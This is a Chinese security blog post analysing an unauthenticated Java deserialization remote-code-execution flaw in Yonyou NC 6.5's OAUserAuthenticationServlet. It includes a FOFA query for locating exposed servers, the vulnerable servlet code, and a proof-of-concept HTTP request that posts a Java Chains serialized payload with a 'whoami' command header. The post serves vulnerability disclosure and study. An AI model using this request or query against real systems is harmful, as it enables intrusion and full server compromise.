---
title: "用友NC OAUserAuthenticationServlet 反序列化代码执行RCE漏洞"
source: https://mrxn.net/jswz/yonyou-nc-OAUserAuthenticationServlet-rce.html
asset_dir: assets/用友nc-oauserauthenticationservlet-反序列化代码执行rce漏洞
---

# 用友NC OAUserAuthenticationServlet 反序列化代码执行RCE漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/10/10 08:29
- 1017浏览
- [0评论](#comment)
- 13分钟阅读

深入探索

安全

身份验证

CRM

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)NC是用公司推出的一款企业管理[软件](#)，涵盖财务、供应链、生产制造等多个业务领域，旨在帮助企业实现信息化管理。用友NC的`OAUserAuthenticationServlet`组件存在反序列化漏洞。该Servlet在处理用户请求时，可能对接收到的序列化数据（如Java的`ObjectInputStream`）未进行安全检查，直接进行反序列化操作。攻击者可以构造恶意的序列化对象，其中包含可执行的代码，当`OAUserAuthenticationServlet`反序列化该恶意对象时，就会触发[代码执行](https://mrxn.net/tag/rce)。该漏洞可能允许攻击者在服务器上执行任意代码，从而完全控制服务器，窃取敏感数据，篡改系统配置，或进行其他恶意活动，对企业的业务系统和数据安全构成严重威胁。

漏洞预警服务

# 影响版本

NC 65

# fofa语法

> app="用友-UFIDA-NC"

# 漏洞分析

深入探索

JSON处理工具

在线安全工具

数据库

## 反序列化

直接看下`OAUserAuthenticationServlet`的实现

```
public class OAUserAuthenticationServlet extends HttpServlet {
    private static final long serialVersionUID = -5847889958965745395L;

    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        ObjectInputStream in = new ObjectInputStream(request.getInputStream());
        HashMap<Object, Object> headInfo = new HashMap();

        try {
            headInfo = (HashMap)in.readObject();
```

由于代码在处理 HTTP 请求时，直接对用户传入的输入流进行 Java 反序列化操作（**`in.readObject()`**），且该操作发生在任何身份验证或安全检查之前，造成了未经身份验证的**远程代码执行（[RCE](https://mrxn.net/tag/rce)）漏洞**。攻击者可以构造恶意的序列化数据流，在服务器反序列化时执行任意代码。

物流软件安全

# 漏洞复现

```
POST /servlet/OAUserAuthenticationServlet?pageId=login HTTP/1.1
Host: nc.mrxn.net
Content-Type: application/x-java-serialized-object
X-Authorization: whoami

{{file(/tmp/javachains.ser)}}
```

深入探索

SQL注入检测工具

网络安全课程

云安全解决方案

使用`Java Chains` 的`TransformerWithDefiningClassLoader2`构造**绕黑名单**进行命令执行回显

[![用友NC OAUserAuthenticationServlet 反序列化代码执行RCE漏洞](images/img-001-b57541fc0e74.webp)](https://image.mrxn.net/9f4fd82858d74bb49e1dc0bdab7ecf70.webp)

成功执行命令并回显执行结果

安全运维咨询

[![用友NC OAUserAuthenticationServlet 反序列化代码执行RCE漏洞](images/img-002-29f9244df0de.webp)](https://image.mrxn.net/e84d0cb9d42647b29c388f4ad946e6bb.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#rce](https://mrxn.net/tag/rce)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [4.1.反序列化](#toc-4-1-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
